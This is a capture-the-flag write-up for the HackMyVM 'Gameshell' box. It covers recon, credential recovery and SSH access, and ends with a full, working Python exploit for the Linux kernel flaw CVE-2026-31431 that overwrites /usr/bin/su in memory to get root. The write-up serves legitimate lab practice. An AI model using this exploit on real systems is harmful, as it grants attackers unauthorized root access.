@@ -1,0 +1,177 @@
+---
+title: Gameshell
+date: '2026-05-20'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - kernel
+  - Copy-Fail
+  - CVE-2026-31431
+  - LINUX
+cover: /mdx_images/copy-fail.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+Hey everyone! Today, we're going after the **Gameshell** machine on [HackMyVM](https://hackmyvm.eu/). Let's dive in!
+
+## Recon
+
+We start with Nmap to identify open ports and gather service information.
+
+```bash
+nmap -sCV -A 192.168.56.102
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-20 14:44 -0400
+Nmap scan report for 192.168.56.102
+Host is up (0.00081s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Retro Bowl
+| http-robots.txt: 4 disallowed entries 
+|_/*.js$ /*.js? /*.css$ /*.css?
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:25:11:18 (Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Port 80 served a static game-themed site. Since `robots.txt` referenced JavaScript and CSS files, I enumerated the web root to look for anything interesting.
+
+```bash
+ζ gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.html           (Status: 200) [Size: 273]
+.htaccess            (Status: 403) [Size: 279]
+style.css            (Status: 200) [Size: 50645]
+robots.txt           (Status: 200) [Size: 84]
+.                    (Status: 200) [Size: 273]
+.html                (Status: 403) [Size: 279]
+.php                 (Status: 403) [Size: 279]
+script.js            (Status: 200) [Size: 13483]
+.htpasswd            (Status: 403) [Size: 279]
+.htm                 (Status: 403) [Size: 279]
+.htpasswds           (Status: 403) [Size: 279]
+.htgroup             (Status: 403) [Size: 279]
+wp-forum.phps        (Status: 403) [Size: 279]
+.htaccess.bak        (Status: 403) [Size: 279]
+.htuser              (Status: 403) [Size: 279]
+Progress: 10848 / 10848 (100.00%)
+```
+
+The most interesting file here was `script.js`, which was heavily obfuscated. Rather than manually beautifying it and decoding each function and string one by one, I used an AI assistant to speed up deobfuscation.
+
+The useful output was:
+
+```js
+const site = "shell-shockers.dsz";
+const loginName = "noob";
+const masterPass = "aBcDeFgHiJkLmNoP";
+```
+
+At this point, we had a username, a master password, and a site value from the deobfuscated JavaScript. That strongly suggested these credentials belonged to a password manager rather than directly to SSH.
+
+The clue was confirmed after decoding the hidden image from style.css, which pointed to lesspass. Logging into lesspass with the recovered values revealed the actual password shown in the third image, which was then used to access the machine.
+
+![Decoded background](/mc/images/decoded_background.png)
+
+![lesspass clue](/mc/images/lesspass.png)
+
+That strengthened the idea that the values recovered from `script.js` were intended as real credentials.
+
+So I tested them directly over SSH using:
+
+- username: `noob`
+- password: `&"0isY/n~(=\G>Ui`
+
+```bash
+ζ ssh noob@192.168.56.102
+# password: '&"0isY/n~(=\G>Ui'
+noob@GameShell5:~$
+```
+
+## Local Enumeration
+
+After getting a shell as `noob`, I transferred `linpeas.sh` to the target and used it to assist local enumeration.
+
+While running `linpeas.sh`, I noticed the machine did not have `grep` installed in the usual path. Since `busybox grep` was available, I used a simple symlink trick so `linpeas.sh` could continue working normally:
+
+```bash
+noob@GameShell5:~$ ln -s "$(command -v busybox)" /tmp/grep
+noob@GameShell5:~$ export PATH="/tmp:$PATH"
+noob@GameShell5:~$ ./linpeas.sh
+```
+
+From enumeration, the host was running:
+
+```bash
+noob@GameShell5:~$ uname -r
+4.19.0-27-amd64
+```
+
+At that point, I asked my AI assistant to compare recent Linux kernel local privilege escalation vulnerabilities against the target's kernel version and exposed features while I continued reviewing the LinPEAS output.
+
+the Assistant found that The strongest match was **CVE-2026-31431 (Copy Fail)**.
+
+Why it stood out:
+
+- the target kernel falls inside the vulnerable era described in public writeups
+- the exploit path relies on the Linux crypto interface (`AF_ALG`) together with `splice()`
+- it does not depend on the same prerequisites as many older user-namespace-based kernel privesc chains
+- the box exposed a suitable target binary: `/usr/bin/su`
+
+For reference, you can read more here:
+
+- [Theori Copy Fail PoC](https://github.com/theori-io/copy-fail-CVE-2026-31431)
+- [Copy Fail advisory](https://copy.fail/)
+
+## Privilege Escalation
+
+I used the public PoC from Theori, but I had to make a **small compatibility change** for the target.
+
+The stock PoC uses `os.splice()`, but the target was running **Python 3.9**, where that call was unavailable in this environment. So I replaced it with a tiny `ctypes` wrapper around libc `splice()`.
+
+Here is the adapted version:
+
+```python
+#!/usr/bin/env python3
+import os as g,zlib,socket as s,ctypes
+libc=ctypes.CDLL(None,use_errno=True);L=ctypes.c_longlong;S=libc.splice
+S.argtypes=[ctypes.c_int,ctypes.POINTER(L),ctypes.c_int,ctypes.POINTER(L),ctypes.c_size_t,ctypes.c_uint];S.restype=ctypes.c_ssize_t
+def d(x):return bytes.fromhex(x)
+def sp(i,o,n,x=None,f=0):
+ a=ctypes.pointer(L(x)) if x is not None else None;r=S(i,a,o,None,n,f)
+ if r<0:raise OSError(ctypes.get_errno(),"splice failed")
+ return r
+def c(f,t,c):
+ a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3)],32768);r,w=g.pipe();sp(f,w,o,0);sp(r,u.fileno(),o)
+ try:u.recv(8+t)
+ except:0
+f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+while i<len(e):c(f,i,e[i:i+4]);i+=4
+g.system("su")
+```
+
+Running it gives a root shell:
+
+```bash
+noob@GameShell5:~$ python3 exploit.py
+# whoami
+root
+```
+
+With that, the machine is fully rooted. GG.
